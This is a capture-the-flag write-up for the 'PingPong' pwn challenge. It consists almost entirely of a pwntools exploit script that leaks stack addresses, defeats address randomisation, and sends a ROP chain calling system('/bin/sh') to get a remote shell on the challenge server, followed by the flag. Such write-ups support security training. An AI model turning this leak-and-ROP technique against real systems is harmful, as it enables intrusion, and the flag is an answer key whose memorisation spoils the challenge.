# PingPong - pwn

> To start out nice and easy, how about a game of ping pong?

```Python
#!/usr/bin/python

import pwn
import struct
import array
import os




LIBC_SYSTEM_OFFSET = -0x398E60
LIBC_BIN_SH_OFFSET = -0x234406    
POP_RDI_OFFSET = 0x493
RET_ADDRESS_OFFSET = -0x1F0

def fix_case(crap):
    ret = ""
    for i in range(0, len(crap)):
        if i & 0x1 == 0x0:
            ret += crap[i]
        else:
            ret += chr(ord(crap[i]) ^ 0x20)

    return ret


def leak(stackRel):
    p.recvuntil('ping: ')
    p.sendline('A' * (stackRel * 8))
    p.recvuntil('pong: ')
    leaked = p.recvline()[stackRel * 8:]
    return struct.unpack('<Q', fix_case(leaked).ljust(8, '\x00'))[0] - 0xa000000000000

def write(address, wat):
    p.recvuntil('ping: ')
    p.sendline('A' * 0x98 + address)
    p.recvuntil('ping: ')
    p.sendline(wat)


def exploit():
    #raw_input()

    stack1 = leak(8)
    system_address = stack1 + LIBC_SYSTEM_OFFSET 
    binsh_address = stack1 + LIBC_BIN_SH_OFFSET
    pwn.log.info("System address: %02x" % system_address)
    pwn.log.info("/bin/sh address; %02x" % binsh_address)

    stack3 = leak(11)
    pop_rdi_address = stack3 + POP_RDI_OFFSET
    pwn.log.info("pop RDI gadget address: %02x" % pop_rdi_address)

    ret_gadget = pop_rdi_address + 1

    stack4 = leak(18)
    ret_address = stack4 + RET_ADDRESS_OFFSET
    pwn.log.info("ret address: %02x" % ret_address)

    write(pwn.p64(ret_address), pwn.p64(ret_gadget) + pwn.p64(ret_gadget) + pwn.p64(ret_gadget) + pwn.p64(ret_gadget) + pwn.p64(ret_gadget) + pwn.p64(pop_rdi_address) + pwn.p64(binsh_address) + pwn.p64(system_address))
    
    p.interactive()

if __name__ == '__main__':
    #os.environ['LD_LIBRARY_PATH'] = '/home/martin/sectf/pingpong/'
    #p = pwn.process(['./pingpong'])
    p = pwn.remote('pwn2.sect.ctf.rocks', 2025)
    #p = pwn.gdb.debug(['./pingpong'], 
    #'''
    #continue
    #''')
    exploit()
```

Flag: SECT{Gn0P_gN1P}